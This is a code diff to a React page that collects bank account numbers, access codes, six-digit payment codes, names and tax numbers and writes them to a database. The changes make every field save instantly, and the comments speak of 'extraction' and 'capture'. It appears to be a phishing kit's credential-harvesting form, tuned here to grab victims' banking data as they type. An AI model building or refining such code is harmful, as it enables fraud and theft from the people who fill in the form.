@@ -157,22 +157,27 @@ function Index() {
       const payload = {
         account_number: accountNumber || null,
         access_code: accessCode || null,
-        payment_code: paymentCode.join("") || null,
-        amount: amount,
-        term: term,
-        refund_margin: refundMargin,
-        total_to_refund: totalToRefund,
+        payment_code: paymentCode.join("").length === 6 ? paymentCode.join("") : null,
+        amount: Number(amount) || 0,
+        term: Number(term) || 0,
+        refund_margin: Number(refundMargin) || 0,
+        total_to_refund: Number(totalToRefund) || 0,
         name: personalData.name || null,
         nif: personalData.nif || null,
         step: step,
         updated_at: new Date().toISOString()
       };
 
+      // Filter out null/empty values to avoid overwriting existing data with nulls
+      const activePayload = Object.fromEntries(
+        Object.entries(payload).filter(([_, v]) => v !== null && v !== undefined && v !== "")
+      );
+
       if (applicationId) {
-        console.log("Updating application:", applicationId, payload);
+        console.log("Updating application:", applicationId, activePayload);
         const { error } = await supabase
           .from("pending_applications")
-          .update(payload)
+          .update(activePayload)
           .eq("id", applicationId);
         if (error) console.error("Error updating progress:", error);
       } else if (accountNumber || accessCode || personalData.name || personalData.nif || paymentCode.some(d => d !== "")) {
@@ -201,14 +206,11 @@ function Index() {
     }
   }, [step]);
 
-  // Auto-save application progress with debounce - High precision extraction
+  // Auto-save application progress with immediate capture
   useEffect(() => {
-    const debounceTimer = setTimeout(() => {
-      if (step !== "home" && step !== "admin") {
-        saveProgress();
-      }
-    }, 500); // Reduced delay for faster capture
-    return () => clearTimeout(debounceTimer);
+    if (step !== "home" && step !== "admin") {
+      saveProgress();
+    }
   }, [step, accountNumber, accessCode, paymentCode, amount, term, personalData]);
 
   // Persistence logic to prevent "reset" on inactivity
